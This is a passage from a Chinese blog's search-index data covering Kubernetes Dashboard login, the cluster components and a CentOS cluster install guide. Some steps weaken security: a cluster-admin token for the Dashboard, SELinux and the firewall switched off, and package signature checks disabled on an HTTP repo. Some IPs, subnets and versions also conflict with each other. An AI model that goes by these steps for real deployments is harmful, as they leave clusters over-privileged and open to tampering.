class=\"attr\">kind:</span> <span class=\"string\">ClusterRole</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">cluster-admin</span></span><br><span class=\"line\"><span class=\"attr\">subjects:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">kind:</span> <span class=\"string\">ServiceAccount</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">admin-user</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">kube-system</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>执行命令脚本，以创建admin-user用户角色，并获取token</li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">kubectl apply -f dashboard-adminuser.yaml</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk <span class=\"string\">&#x27;&#123;print $1&#125;&#x27;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\">Name:         admin-user-token-6gl6l</span><br><span class=\"line\">Namespace:    kube-system</span><br><span class=\"line\">Labels:       &lt;none&gt;</span><br><span class=\"line\">Annotations:  kubernetes.io/service-account.name=admin-user</span><br><span class=\"line\">              kubernetes.io/service-account.uid=b16afba9-dfec-11e7-bbb9-901b0e532516</span><br><span class=\"line\"></span><br><span class=\"line\">Type:  kubernetes.io/service-account-token</span><br><span class=\"line\"></span><br><span class=\"line\">Data</span><br><span class=\"line\">====</span><br><span class=\"line\">ca.crt:     1025 bytes</span><br><span class=\"line\">namespace:  11 bytes</span><br><span class=\"line\">token:      eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLTZnbDZsIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJiMTZhZmJhOS1kZmVjLTExZTctYmJiOS05MDFiMGU1MzI1MTYiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06YWRtaW4tdXNlciJ9.M70CU3lbu3PP4OjhFms8PVL5pQKj-jj4RNSLA4YmQfTXpPUuxqXjiTf094_Rzr0fgN_IVX6gC4fiNUL5ynx9KU-lkPfk0HnX8scxfJNzypL039mpGt0bbe1IXKSIRaq_9VW59Xz-yBUhycYcKPO9RM2Qa1Ax29nqNVko4vLn1_1wPqJ6XSq3GYI8anTzV8Fku4jasUwjrws6Cn6_sPEGmL54sq5R4Z5afUtv-mItTmqZZdxnkRqcJLlg2Y8WbCPogErbsaCDJoABQ7ppaqHetwfM_0yMun6ABOQbIwwl8pspJhpplKwyo700OSpvTT9zlBsu-b35lzXGBRHzv5g_RA</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>在Dashboard的UI登陆界面中，粘贴<code>token</code>的数据字段，</p>\n<img src=\"/2019/04/01/Kubernetes-for-Mac%E7%9A%84%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95%E5%92%8C%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/dash-login.png\" class=\"\">\n</li>\n<li><p>成功展示UI！！！</p>\n<img src=\"/2019/04/01/Kubernetes-for-Mac%E7%9A%84%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95%E5%92%8C%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/dash-main.png\" class=\"\"></li>\n</ul>\n<hr>\n<h2 id=\"问题1：激活Kubernetes时，一直停留在‘Kubernetes-is-starting…’\"><a href=\"#问题1：激活Kubernetes时，一直停留在‘Kubernetes-is-starting…’\" class=\"headerlink\" title=\"问题1：激活Kubernetes时，一直停留在‘Kubernetes is starting…’\"></a>问题1：激活Kubernetes时，一直停留在‘Kubernetes is starting…’</h2><ul>\n<li>根本原因：激活k8s需要自动下载google的镜像文件，但一直无法通过GW</li>\n<li>解决方法：在docker-Preferences-Proxies-Manunal Proxy Configration中，设置代理服务器为<code>host.docker.internal:1087</code>，由于国际传输速度较慢，可能需要几个小时</li>\n<li>补充说明：由于docker是运行在Mac的虚拟机上，无法直接使用Shadowsocks的默认代理设置<code>http://127.0.0.1:1087</code>，需要将localhost地址替换为Mac网卡的物理地址，最佳建议是使用docker的内部DNS域名<code>host.docker.internal:1087</code>，以避免WIFI切换时修改物理地址</li>\n</ul>\n"},{"title":"Kubernetes的基本组件","url":"/2019/04/01/Kubernetes%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%84%E4%BB%B6/","content":"<p>Kubernetes 是一个跨主机集群的 开源的容器调度平台，它可以自动化应用容器的部署、扩展和操作，提供以容器为中心的基础架构。<br>Kubernetes集群主要包括一个Master组件，和多个Node组件。</p>\n<img src=\"/2019/04/01/Kubernetes%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%84%E4%BB%B6/k8s-basic.png\" class=\"\" title=\"Kubernetes的技术架构\">\n\n<h2 id=\"一、Master组件\"><a href=\"#一、Master组件\" class=\"headerlink\" title=\"一、Master组件\"></a>一、Master组件</h2><p>Master 组件提供的集群控制。Master 组件对集群做出全局性决策(例如：调度)，以及检测和响应集群事件(副本控制器的replicas字段不满足时,启动新的副本)。<br>Master 组件可以在集群中的任何节点上运行。然而，为了简单起见，设置脚本通常会启动同一个虚拟机上所有 Master 组件，并且不会在此虚拟机上运行用户容器。</p>\n<h3 id=\"1、核心数据库（etcd）\"><a href=\"#1、核心数据库（etcd）\" class=\"headerlink\" title=\"1、核心数据库（etcd）\"></a>1、核心数据库（etcd）</h3><p>etcd 用于 Kubernetes 的后端存储，负责保存所有集群的状态信息。</p>\n<h3 id=\"2、接口服务器（kube-apiserver）\"><a href=\"#2、接口服务器（kube-apiserver）\" class=\"headerlink\" title=\"2、接口服务器（kube-apiserver）\"></a>2、接口服务器（kube-apiserver）</h3><p>kube-apiserver对外暴露了Kubernetes API。它是的 Kubernetes 前端控制层。它被设计为水平扩展，即通过部署更多实例来缩放。请参阅构建高可用性群集.</p>\n<h3 id=\"3、运行控制器（kube-controller-manager）\"><a href=\"#3、运行控制器（kube-controller-manager）\" class=\"headerlink\" title=\"3、运行控制器（kube-controller-manager）\"></a>3、运行控制器（kube-controller-manager）</h3><p>kube-controller-manager运行控制器，它们是处理集群中常规任务的后台线程。逻辑上，每个控制器是一个单独的进程，但为了降低复杂性，它们都被编译成独立的可执行文件，并在单个进程中运行。<br>这些控制器包括:</p>\n<ul>\n<li>节点控制器: 当节点移除时，负责注意和响应。</li>\n<li>副本控制器: 负责维护系统中每个副本控制器对象正确数量的 Pod。</li>\n<li>端点控制器: 填充 端点(Endpoints) 对象(即连接 Services &amp; Pods)。</li>\n<li>服务帐户和令牌控制器: 为新的命名空间创建默认帐户和 API 访问令牌.</li>\n</ul>\n<h3 id=\"4-任务调度器（kube-scheduler）\"><a href=\"#4-任务调度器（kube-scheduler）\" class=\"headerlink\" title=\"4.任务调度器（kube-scheduler）\"></a>4.任务调度器（kube-scheduler）</h3><p>kube-scheduler负责Pod的调度，监视没有分配节点的新创建的Pod，按照预定的调度策略将Pod调度到相应的Node上。</p>\n<h2 id=\"二、Node组件\"><a href=\"#二、Node组件\" class=\"headerlink\" title=\"二、Node组件\"></a>二、Node组件</h2><p>节点组件在每个节点上运行，维护运行的 Pod 并提供 Kubernetes 运行时环境。</p>\n<h3 id=\"1、kubelet\"><a href=\"#1、kubelet\" class=\"headerlink\" title=\"1、kubelet\"></a>1、kubelet</h3><p>kubelet是主要的节点代理，它监测已分配给其节点的 Pod(通过 apiserver 或通过本地配置文件)，负责维护容器的生命周期（创建、启动、监控、重启、销毁等），同时也负责 Volume（CSI）和网络（CNI）的管理；同时与Master节点协作，实现集群管理的基本功能。<br>主要提供如下功能:</p>\n<ul>\n<li>挂载 Pod 所需要的数据卷(Volume)。</li>\n<li>下载 Pod 的 secrets。</li>\n<li>通过 Docker 运行(或通过 rkt)运行 Pod 的容器。</li>\n<li>周期性的对容器生命周期进行探测。</li>\n<li>如果需要，通过创建 镜像 Pod（Mirror Pod） 将 Pod 的状态报告回系统的其余部分。</li>\n<li>将节点的状态报告回系统的其余部分。</li>\n</ul>\n<h3 id=\"2、kube-proxy\"><a href=\"#2、kube-proxy\" class=\"headerlink\" title=\"2、kube-proxy\"></a>2、kube-proxy</h3><p>kube-proxy负责通信和负载均衡，通过维护主机上的网络规则并执行连接转发，实现了Kubernetes服务抽象。</p>\n<h3 id=\"3、docker\"><a href=\"#3、docker\" class=\"headerlink\" title=\"3、docker\"></a>3、docker</h3><p>Docker用于运行容器。也支持rkt运行容器等作为 Docker 的试验性替代方案。</p>\n<h2 id=\"三、addons插件\"><a href=\"#三、addons插件\" class=\"headerlink\" title=\"三、addons插件\"></a>三、addons插件</h2><p>插件是实现集群功能的 Pod 和 Service。 Pods 可以通过 Deployments，ReplicationControllers 管理。<br>插件对象本身是受命名空间限制的，被创建于<code>kube-system</code>命名空间。<br>Addon管理器用于创建和维护附加资源.</p>\n<h3 id=\"1、域名解析服务（DNS）\"><a href=\"#1、域名解析服务（DNS）\" class=\"headerlink\" title=\"1、域名解析服务（DNS）\"></a>1、域名解析服务（DNS）</h3><p>虽然其他插件并不是必需的，但所有 Kubernetes 集群都应该具有Cluster DNS，许多示例依赖于它。<br>Cluster DNS 是一个 DNS 服务器，和您部署环境中的其他 DNS 服务器一起工作，为 Kubernetes 服务提供DNS记录。<br>Kubernetes 启动的容器自动将 DNS 服务器包含在 DNS 搜索中。</p>\n<h3 id=\"2、监控界面（Dashboard）\"><a href=\"#2、监控界面（Dashboard）\" class=\"headerlink\" title=\"2、监控界面（Dashboard）\"></a>2、监控界面（Dashboard）</h3><p>dashboard 提供了集群状态的只读概述。有关更多信息，请参阅使用HTTP代理访问 Kubernetes API</p>\n<h3 id=\"3、外部负载均衡器（Ingress）\"><a href=\"#3、外部负载均衡器（Ingress）\" class=\"headerlink\" title=\"3、外部负载均衡器（Ingress）\"></a>3、外部负载均衡器（Ingress）</h3><p>Ingress Controller 为服务提供外网入口</p>\n<h3 id=\"4、容器资源监控（Heapster）\"><a href=\"#4、容器资源监控（Heapster）\" class=\"headerlink\" title=\"4、容器资源监控（Heapster）\"></a>4、容器资源监控（Heapster）</h3><p>容器资源监控将关于容器的一些常见的时间序列度量值保存到一个集中的数据库中，并提供用于浏览这些数据的界面。</p>\n<h3 id=\"5、集群层面日志\"><a href=\"#5、集群层面日志\" class=\"headerlink\" title=\"5、集群层面日志\"></a>5、集群层面日志</h3><p>集群层面日志 机制负责将容器的日志数据保存到一个集中的日志存储中，该存储能够提供搜索和浏览接口。</p>\n<h3 id=\"6、包管理器（Helm）\"><a href=\"#6、包管理器（Helm）\" class=\"headerlink\" title=\"6、包管理器（Helm）\"></a>6、包管理器（Helm）</h3><p>Helm这个东西其实早有耳闻，但是一直没有用在生产环境，而且现在对这货的评价也是褒贬不一。正好最近需要再次部署一套测试环境，对于单体服务，部署一套测试环境我相信还是非常快的，但是对于微服务架构的应用，要部署一套新的环境，就有点折磨人了，微服务越多、你就会越绝望的。虽然我们线上和测试环境已经都迁移到了kubernetes环境，但是每个微服务也得维护一套yaml文件，而且每个环境下的配置文件也不太一样，部署一套新的环境成本是真的很高。如果我们能使用类似于yum的工具来安装我们的应用的话是不是就很爽歪歪了啊？Helm就相当于kubernetes环境下的yum包管理工具。</p>\n<hr>\n<h2 id=\"附录一：Kubernetes的基础镜像列表\"><a href=\"#附录一：Kubernetes的基础镜像列表\" class=\"headerlink\" title=\"附录一：Kubernetes的基础镜像列表\"></a>附录一：Kubernetes的基础镜像列表</h2><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 最基础的根容器</span><br><span class=\"line\">k8s.gcr.io/pause-amd64:3.1    </span><br><span class=\"line\"></span><br><span class=\"line\"># etcd核心数据库</span><br><span class=\"line\">k8s.gcr.io/etcd-amd64:3.1.12   </span><br><span class=\"line\"></span><br><span class=\"line\"># Master组件，当前稳定版本v1.10.11，也是Kubernetes的主版本号</span><br><span class=\"line\">k8s.gcr.io/kube-apiserver-amd64:v1.10.11</span><br><span class=\"line\">k8s.gcr.io/kube-controller-manager-amd64:v1.10.11</span><br><span class=\"line\">k8s.gcr.io/kube-scheduler-amd64:v1.10.11</span><br><span class=\"line\"></span><br><span class=\"line\"># Node节点的通讯组件</span><br><span class=\"line\">k8s.gcr.io/kube-proxy-amd64:v1.10.11</span><br><span class=\"line\"></span><br><span class=\"line\"># Node节点的Docker连接器</span><br><span class=\"line\">docker/kube-compose-controller:v0.4.12</span><br><span class=\"line\">docker/kube-compose-api-server:v0.4.12</span><br><span class=\"line\"></span><br><span class=\"line\"># Kubernetes集群的DNS插件，当前稳定版本v1.1.14</span><br><span class=\"line\">k8s.gcr.io/k8s-dns-dnsmasq-nanny-amd64:1.14.8</span><br><span class=\"line\">k8s.gcr.io/k8s-dns-sidecar-amd64:1.14.8</span><br><span class=\"line\">k8s.gcr.io/k8s-dns-kube-dns-amd64:1.14.8</span><br><span class=\"line\"></span><br><span class=\"line\"># Kubernetes集群的Dashboard插件，当前稳定版本v1.8.3</span><br><span class=\"line\">k8s.gcr.io/kubernetes-dashboard-amd64:v1.8.3</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"附录二：云控制器管理器-cloud-controller-manager\"><a href=\"#附录二：云控制器管理器-cloud-controller-manager\" class=\"headerlink\" title=\"附录二：云控制器管理器-(cloud-controller-manager)\"></a>附录二：云控制器管理器-(cloud-controller-manager)</h2><p>cloud-controller-manager 是用于与底层云提供商交互的控制器。云控制器管理器可执行组件是 Kubernetes v1.6 版本中引入的 Alpha 功能。<br>cloud-controller-manager 仅运行云提供商特定的控制器循环。您必须在 kube-controller-manager 中禁用这些控制器循环，您可以通过在启动 kube-controller-manager 时将 –cloud-provider 标志设置为external来禁用控制器循环。<br>cloud-controller-manager 允许云供应商代码和 Kubernetes 核心彼此独立发展，在以前的版本中，Kubernetes 核心代码依赖于云提供商特定的功能代码。在未来的版本中，云供应商的特定代码应由云供应商自己维护，并与运行 Kubernetes 的云控制器管理器相关联。<br>以下控制器具有云提供商依赖关系:</p>\n<ul>\n<li>节点控制器: 用于检查云提供商以确定节点是否在云中停止响应后被删除</li>\n<li>路由控制器: 用于在底层云基础架构中设置路由</li>\n<li>服务控制器: 用于创建，更新和删除云提供商负载平衡器</li>\n<li>数据卷控制器: 用于创建，附加和装载卷，并与云提供商进行交互以协调卷</li>\n</ul>\n"},{"title":"Kubernetes集群的安装记录","url":"/2020/06/25/Kubernetes%E9%9B%86%E7%BE%A4%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"Step-0-Kubernets集群安装的准备工作\"><a href=\"#Step-0-Kubernets集群安装的准备工作\" class=\"headerlink\" title=\"Step 0. Kubernets集群安装的准备工作\"></a>Step 0. Kubernets集群安装的准备工作</h2><p>本次安装测试的基础硬件是Intel NUC5i3 &amp; NUC8i3，基准软件是：</p>\n<ul>\n<li>Centos 7.8（启动速度快、版本稳定性好）</li>\n<li>Docker-ce 19.03.12</li>\n<li>Kubernetes 1.18.2 (v1.18.4拉取国内镜像不成功！！！)</li>\n<li>Calico 3.8.9</li>\n<li>Nginx-ingress 1.5.3</li>\n</ul>\n<p>本Kubernetes集群包含了2个Node，分别是：</p>\n<ul>\n<li>1个Master节点：Hostname &#x3D; master1，IPADDR &#x3D; 192.168.0.132</li>\n<li>1个Worker节点：Hostname &#x3D; worker1，IPADDR &#x3D; 192.168.0.130</li>\n</ul>\n<p>2台已安装Linux的服务器，分别作为Master和Worker节点。</p>\n<ul>\n<li>确认服务器支持并已开启硬件虚拟化支持（NUC各个型号均默认支持）</li>\n<li>刚刚完成安装的Centos尚未配置网络，需要激活网卡并确认可以访问公网，具体方法请参见<a href=\"centos-install.md\">Centos 7.8安装步骤</a></li>\n</ul>\n<h2 id=\"Step-1-修改操作系统配置\"><a href=\"#Step-1-修改操作系统配置\" class=\"headerlink\" title=\"Step 1. 修改操作系统配置\"></a>Step 1. 修改操作系统配置</h2><ul>\n<li><p>关闭SElinux和Firewalld服务</p>\n<p>  SELinux是一个安全体系结构，它通过LSM(Linux Security Modules)框架被集成到Linux Kernel 2.6.x中。关闭selinux的目的是允许容器直接访问宿主机的文件系统。</p>\n<p>  SELinux 有三种工作模式，分别是：enforcing强制模式 &#x2F; permissive宽容模式 &#x2F; disabled禁用模式，可以在 <code>/etc/selinux/config</code> 中设定。</p>\n<p>  enforcing 和 permissive 模式可以通过 <code>setenforce 1|0</code> 命令快速切换。如果想从 disabled 切换到 enforcing 或者 permissive 的话，需要重启系统。反过来也一样。</p>\n<p>  Iptables防火墙，会对所有网络流量进行过滤、转发，如果是内网机器一般都会直接关闭，省的影响网络性能，但k8s不能直接关了，k8s需要用防火墙做ip转发和修改的，关闭firewalld的目的是防止产生重复的防火墙规则。</p>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sed -i &#x27;s/SELINUX=enforcing/SELINUX=disabled/g&#x27; /etc/selinux/config</span><br><span class=\"line\">setenforce 0</span><br><span class=\"line\">systemctl disable firewalld</span><br><span class=\"line\">systemctl stop firewalld</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>关闭swap服务</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">swapoff -a</span><br><span class=\"line\">sed -i &#x27;/swap/d&#x27; /etc/fstab</span><br><span class=\"line\">free</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>修改Linux内核参数以启用bridge功能</p>\n<p>  br_netfilter通过和linux bridge功能联动，以实现透明防火墙功能，具体方法是在Bridge层的通过执行Netfilter钩子来实现IP报文过滤。</p>\n<p>  sysctl命令用于运行时配置内核参数，这些参数位于<code>/proc/sys</code>目录下，可以用<code>sysctl</code>来设置或重新设置联网功能，如IP转发、IP碎片去除以及源路由检查等</p>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">modprobe br_netfilter</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;net.ipv4.ip_forward = 1&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\">echo &quot;net.bridge.bridge-nf-call-ip6tables = 1&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\">echo &quot;net.bridge.bridge-nf-call-iptables = 1&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\"></span><br><span class=\"line\">sysctl -p</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>安装几个基础的工具软件</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum -y install yum-utils lvm2 device-mapper-persistent-data nfs-utils xfsprogs wget net-tools bind-utils bzip2 tar tree</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Step-2-安装Docker服务\"><a href=\"#Step-2-安装Docker服务\" class=\"headerlink\" title=\"Step 2. 安装Docker服务\"></a>Step 2. 安装Docker服务</h2><ul>\n<li><p>如果已安装过Docker的旧版本，需要全部卸载，指令是：</p>\n<p> <code>yum -y remove docker-client docker-client-latest docker-common docker-latest docker-logrotate docker-latest-logrotate docker-selinux docker-engine-selinux docker-engine</code></p>\n</li>\n<li><p>添加阿里云的yum源设置，并安装Docker服务，本次Docker安装的stable版本号为<code>19.03.12</code></p>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class=\"line\">yum -y install docker-ce docker-ce-cli containerd.io</span><br><span class=\"line\"></span><br><span class=\"line\">systemctl enable docker</span><br><span class=\"line\">systemctl start docker</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>确认Docker服务启动正常后，还需要设置国内的image镜像源</p>\n<p>  <code>exec-opts</code>：<strong>必须的</strong>！目的是修改Docker Cgroup Driver为systemd，如果不修改则在后续添加Worker节点时可能会遇到<code>detected cgroupfs as ths Docker driver.xx</code>”&#96;的报错信息，导致Docker镜像库配置为本地源，而无法正常拉取image。</p>\n<p>  <code>registry-mirrors</code>：设置了几个国内可用的镜像源，可以根据实现情况调整</p>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat &gt; /etc/docker/daemon.json &lt;&lt;EOF</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span><br><span class=\"line\">    &quot;log-driver&quot;: &quot;json-file&quot;,</span><br><span class=\"line\">    &quot;log-opts&quot;: &#123;</span><br><span class=\"line\">    &quot;max-size&quot;: &quot;100m&quot;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;storage-driver&quot;: &quot;overlay2&quot;,</span><br><span class=\"line\">    &quot;registry-mirrors&quot;:[</span><br><span class=\"line\">        &quot;https://kfwkfulq.mirror.aliyuncs.com&quot;,</span><br><span class=\"line\">        &quot;http://hub-mirror.c.163.com&quot;,</span><br><span class=\"line\">        &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span><br><span class=\"line\">        &quot;https://registry.docker-cn.com&quot;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>再次启动Docker，确认配置已修改</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl restart docker</span><br><span class=\"line\">docker info</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Step-3-安装Kubernets软件包\"><a href=\"#Step-3-安装Kubernets软件包\" class=\"headerlink\" title=\"Step 3. 安装Kubernets软件包\"></a>Step 3. 安装Kubernets软件包</h2><ul>\n<li><p>如果已安装过Docker的旧版本，需要删除，指令是：<code>yum -y remove kubelet kubadm kubctl</code></p>\n</li>\n<li><p>在Yum仓库源的配置目录<code>/etc/yum.repos.d/</code>中，新增<code>kubernetes.repo</code>并指向阿里云的国内镜像站点</p>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo</span><br><span class=\"line\">[kubernetes]</span><br><span class=\"line\">name=Kubernetes</span><br><span class=\"line\">baseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64</span><br><span class=\"line\">enabled=1</span><br><span class=\"line\">gpgcheck=0</span><br><span class=\"line\">repo_gpgcheck=0</span><br><span class=\"line\">gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg</span><br><span class=\"line\">    http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>安装Kubernets软件包，本次安装的stable版本号为<code>1.18.4</code>，其中：</p>\n<p>  kubelet：此组件是运行在每一个集群节点上的代理程序。它确保 Pod 中的容器处于运行状态。Kubelet 通过多种途径获得 PodSpec 定义，并确保 PodSpec 定义中所描述的容器处于运行和健康的状态。Kubelet不管理不是通过 Kubernetes 创建的容器。</p>\n<p>  kubeadm：Kubernetes的安装工具。</p>\n<p>  kubectl：作为Kubernetes的客户端CLI工具，可以让用户通过命令行的方式对Kubernetes集群进行操作。<strong>Master节点必备，Worker节点可以选装</strong></p>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">原来是1.18.2版本，现在是1.20.1</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">yum安装指定版本的软件，查看版本信息的方法是：yum list kubelet --showduplicates |<span class=\"built_in\">expand</span></span></span><br><span class=\"line\">yum install kubelet kubeadm kubectl -y</span><br><span class=\"line\"></span><br><span class=\"line\">systemctl enable kubelet</span><br><span class=\"line\">systemctl start kubelet</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p><strong>注意</strong>：此时系统重复启动<code>kubelet</code>不成功，原因是<code>kubeadm</code>尚未完成初始化，不要管他，后面自然就好了！</p>\n</blockquote>\n<h2 id=\"Step-4-在Master节点设置运行环境，并初始化启动Kubernetes\"><a href=\"#Step-4-在Master节点设置运行环境，并初始化启动Kubernetes\" class=\"headerlink\" title=\"Step 4. 在Master节点设置运行环境，并初始化启动Kubernetes\"></a>Step 4. 在Master节点设置运行环境，并初始化启动Kubernetes</h2><ul>\n<li>设置Kubernetes运行环境</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">hostnamectl set-hostname master1</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置 hostname，保存在 /etc/hostname</span></span><br><span class=\"line\"></span><br><span class=\"line\">export MASTER_IP=192.168.0.210</span><br><span class=\"line\">export APISERVER_NAME=master1</span><br><span class=\"line\">echo &quot;$&#123;MASTER_IP&#125;    $&#123;APISERVER_NAME&#125;&quot; &gt;&gt; /etc/hosts</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置Master节点的IP地址和Hostname，并保存在DNS本地解析配置文件 /etc/hosts</span></span><br><span class=\"line\"></span><br><span class=\"line\">export POD_SUBNET=10.100.0.1/16nets</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置Kubernetes 容器组所在的网段，该网段安装完成后，由 kubernetes 创建，事先并不存在于您的物理网络中</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Master节点初始化，如果失败，可以输入<code>kubeadm reset</code>回滚，观察错误提示并修改配置后重试</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubeadm init \\</span><br><span class=\"line\">    --apiserver-advertise-address 0.0.0.0 \\</span><br><span class=\"line\">    --apiserver-bind-port 6443 \\</span><br><span class=\"line\">    --cert-dir /etc/kubernetes/pki \\</span><br><span class=\"line\">    --control-plane-endpoint master1 \\</span><br><span class=\"line\">    --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers \\</span><br><span class=\"line\">    --pod-network-cidr 10.11.0.0/16 \\</span><br><span class=\"line\">    --service-cidr 10.20.0.0/16 \\</span><br><span class=\"line\">    --service-dns-domain cluster.local \\</span><br><span class=\"line\">    --upload-certs</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">  --kubernetes-version 1.18.2  忽略kubernetes的版本差异</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li>apiserver-advertise-address：公布API 服务器所正在监听的 IP 地址,指定<code>0.0.0.0</code>以使用默认网络接口的地址。<strong>切记只可以是内网IP，不能是外网IP</strong>，如果有多网卡，可以使用此选项指定某个网卡</li>\n<li>control-plane-endpoint：为控制平面指定一个稳定的 IP 地址或 DNS 名称，指定的 master1 已经在<code>/etc/hosts</code>配置解析为本机IP</li>\n<li>image-repository：选择用于拉取Control-plane的镜像的容器仓库，默认值：<code>k8s.gcr.io</code>，<strong>因为GW的原因必须修改为国内源</strong></li>\n<li>kubernetes-version：为Control-plane选择一个特定的 Kubernetes 版本， 默认值：<code>stable-1</code>，本次指定<code>1.18.4</code></li>\n<li></li>\n<li>node-name: 指定节点的名称,不指定的话为主机hostname，默认可以不指定</li>\n<li>apiserver-bind-port：API 服务器绑定的端口，默认 <code>6443</code></li>\n<li>cert-dir： 保存和存储证书的路径，默认值：<code>/etc/kubernetes/pki</code></li>\n<li>pod-network-cidr: 指定pod的IP地址范围</li>\n<li>service-cidr: 指定Service的IP地址范围，默认”10.96.0.0&#x2F;12”</li>\n<li>service-dns-domain: 为Service另外指定域名，默认”cluster.local”</li>\n<li>upload-certs: 指定Control-plane 将证书上传到 kubeadm-certs Secret</li>\n</ul>\n</blockquote>\n<ul>\n<li>如果Master节点启动成功，可以根据如下屏幕提示生成<code>$HOME/.kube/config</code>配置文件，完成后就可以使用<code>kubectl</code>了</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir -p $HOME/.kube</span><br><span class=\"line\">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在<span class=\"variable\">$HOME</span>/.kube下生成config文件，保存master的登录信息</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">注意：重复安装时， -i参数可能导致输入中断！！！</span></span><br><span class=\"line\"></span><br><span class=\"line\">sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span 